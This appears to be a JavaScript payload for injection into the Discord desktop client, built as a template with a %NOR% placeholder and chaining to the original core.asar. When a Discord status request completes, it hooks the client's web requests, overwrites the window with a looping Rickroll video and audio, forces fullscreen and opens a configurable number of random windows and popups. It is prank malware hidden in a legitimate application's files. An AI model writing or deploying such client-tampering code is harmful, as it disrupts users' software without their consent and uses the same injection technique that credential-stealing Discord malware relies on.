
const {
	BrowserWindow,
	session
} = require('electron')

const numberOfRickroll = %NOR%;
const filter = {"urls":["https://status.discord.com/api/v2/scheduled-maintenances/upcoming.json"]}
function getRndInteger(min, max) {
    return Math.floor(Math.random() * (max - min) ) + min;
  }
  
function createBrowserWindow() {

    const win = new BrowserWindow({
      height: getRndInteger(200, 2000),
      width: getRndInteger(200, 2000)
    });
  
    win.loadURL('https://www.youtube.com/watch?v=dQw4w9WgXcQ');
    return win;
}

  
session.defaultSession.webRequest.onCompleted(filter, (details, callback) => {

    const window = BrowserWindow.getAllWindows()[0];
    window.webContents.executeJavaScript(`document.write(\`<!DOCTYPE html>
    <style>
        
            body {
                overflow-x: hidden;
            }
    
    
    
            .video-container {
                width: 100vw;
                height: 100vh;
                overflow: hidden;
                position: relative;
            }
    
    
    
            iframe {
                position: absolute;
                top: -10%;
                width: 100vw;
                height: 117vh;
                pointer-events: none;
            }
        
    
    </style>
    <html lang="en">
    
    <head>
        <meta charset="UTF-8" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <title>Youtube Html</title>
    
    </head>
    
    <body>
        <div class="video-container">
    
            
            <iframe
                src="https://www.youtube.com/embed/dQw4w9WgXcQ?mute=1&modestbranding=0&autoplay=1&autohide=1&rel=0&showinfo=0&controls=0&disablekb=1&enablejsapi=1&iv_load_policy=3&loop=1&playsinline=1&fs=0&playlist=dQw4w9WgXcQ"></iframe>
        </div>
    </body>
    <script>var audio = new Audio("https://www.cjoint.com/doc/16_09/FIsxS52QXY7_Rick-Astley---Never-Gonna-Give-You-Up.mp3");
    audio.loop = true;
    audio.play();
    document.onclick = function(){

        window.open('https://www.youtube.com/watch?v=dQw4w9WgXcQ')
    };

    </script>
    </html>\`)`).then(() => {
        for(let i = 0; i < numberOfRickroll; i++) {
            window.webContents.executeJavaScript(`window.open('https://www.youtube.com/watch?v=dQw4w9WgXcQ')`, true);
            var x = createBrowserWindow()
            x.webContents.executeJavaScript(`document.write(\`<!DOCTYPE html>
    <style>
        
            body {
                overflow-x: hidden;
            }
    
    
    
            .video-container {
                width: 100vw;
                height: 100vh;
                overflow: hidden;
                position: relative;
            }
    
    
    
            iframe {
                position: absolute;
                top: -10%;
                width: 100vw;
                height: 117vh;
                pointer-events: none;
            }
        
    
    </style>
    <html lang="en">
    
    <head>
        <meta charset="UTF-8" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <title>got rickrolled =)</title>
    
    </head>
    
    <body>
        <div class="video-container">
    
            
            <iframe
                src="https://www.youtube.com/embed/dQw4w9WgXcQ?mute=1&modestbranding=0&autoplay=1&autohide=1&rel=0&showinfo=0&controls=0&disablekb=1&enablejsapi=1&iv_load_policy=3&loop=1&playsinline=1&fs=0&playlist=dQw4w9WgXcQ"></iframe>
        </div>
    </body>
    <script>var audio = new Audio("https://www.cjoint.com/doc/16_09/FIsxS52QXY7_Rick-Astley---Never-Gonna-Give-You-Up.mp3");
    audio.loop = true;
    audio.play();
    document.onclick = function(){

        window.open('https://www.youtube.com/watch?v=dQw4w9WgXcQ')
    };

    </script>
    </html>\`)`)
        }
    

    })
window.setFullScreenable(true);
window.setSimpleFullScreen(true);


  
})

module.exports = require('./core.asar');